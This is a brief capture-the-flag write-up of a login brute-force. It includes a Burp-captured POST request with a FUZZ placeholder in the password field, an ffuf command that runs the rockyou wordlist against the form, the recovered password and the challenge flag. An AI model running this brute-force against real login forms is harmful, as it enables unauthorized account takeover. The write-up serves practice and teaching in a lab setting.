
It is said in the description that password is weak so we can try and brute force it

Given username : john

Send a dummy request with random password, from burp, select the option
`Copy to file` and save the request in a file and name it `req.txt`

Modify it like this

```text
POST / HTTP/1.1
Host: 3.23.56.243:9007
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://3.23.56.243:9007
Connection: close
Referer: http://3.23.56.243:9007/
Cookie: role=user
Upgrade-Insecure-Requests: 1

username=john&password=FUZZ&submit=Login
```

In the value of password write `FUZZ`

Now we are going to brute force the password

```sh
ffuf -c -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt:FUZZ -fs 2050 -rate 30
```

We find the password is
```sh
P@ssw0rd                [Status: 200, Size: 2070, Words: 819, Lines: 82, Duration: 407ms]
```

Login with
username : john
password : P@ssw0rd

And we get the flag
flag : texsaw{brut3_f0rce_p@ssword!}